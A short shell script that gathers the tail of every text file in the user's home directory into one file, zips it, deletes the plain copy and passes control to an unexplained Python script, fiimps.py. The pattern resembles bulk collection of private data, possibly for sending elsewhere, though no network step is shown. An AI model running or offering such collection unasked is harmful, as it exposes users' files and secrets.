#!/bin/sh

find /home/$USER -type f -exec grep -Iq . {} \; -exec tail -v {} + > file;
zip file.zip file
rm file
python3 fiimps.py $1 $2;

